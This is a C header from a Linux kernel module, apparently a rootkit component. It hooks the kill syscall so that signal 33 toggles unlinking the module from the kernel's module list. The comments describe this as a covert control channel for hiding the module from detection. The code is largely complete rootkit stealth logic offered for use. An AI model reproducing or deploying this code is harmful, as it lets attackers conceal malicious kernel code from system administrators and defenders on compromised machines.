#ifndef KILL_H
#define KILL_H

#include <linux/module.h>
#include <linux/mutex.h>

extern struct list_head module_list;
/*
 * Control channel: kill -33 <pid> toggles quiet mode (module-list removal).
 * Signal 33 is reserved by glibc on x86_64; no legitimate program sends it.
 *
 * All list operations AND the hidden flag are performed while holding
 * module_mutex — the list and the state can never disagree, and two
 * concurrent toggles serialize correctly.
 *
 * Reinsertion safety: the insertion anchor is &module_list (the static
 * list head in kernel core — it can never be freed), resolved fresh at
 * show time. No pointer to another module's node is ever cached.
 */

static int hidden = 0;
static asmlinkage long (*og_kill)(pid_t pid, int sig);

static void hideme(void)
{
    mutex_lock(&module_mutex);
    if (!hidden) {
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
    mutex_unlock(&module_mutex);
}

static void showme(void)
{
    mutex_lock(&module_mutex);
    if (hidden) {
        list_add_tail(&THIS_MODULE->list, &module_list);
        hidden = 0;
    }
    mutex_unlock(&module_mutex);
}

static asmlinkage long hooked_kill(pid_t pid, int sig)
{
    if (sig == 33) {
        if (hidden)
            showme();
        else
            hideme();
        return 0;
    }
    return og_kill(pid, sig);
}

#endif